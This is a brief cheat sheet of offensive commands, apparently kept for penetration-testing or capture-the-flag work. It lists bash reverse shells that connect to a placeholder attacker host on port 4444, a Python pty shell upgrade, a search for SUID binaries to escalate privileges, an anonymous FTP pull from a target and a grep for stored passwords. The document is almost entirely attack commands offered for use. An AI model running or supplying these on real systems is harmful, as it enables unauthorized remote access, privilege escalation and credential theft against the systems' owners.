### List of most used tools here. 

source Public/P2/bin/activate

python3 -c 'import pty;pty.spawn("/bin/bash");'
find / -perm -4000 -type f 2>/dev/null
sh -c 'bash -i >& /dev/tcp/{{LHOST}}/4444 0>&1'
echo "bash -i >& /dev/tcp/{{LHOST}}/4444 0>&1" | bash

wget -r ftp://anonymous:anonymous@{{TARGET_IP}}/{{FOLDER}}
grep -rn "password" /path/to/blah
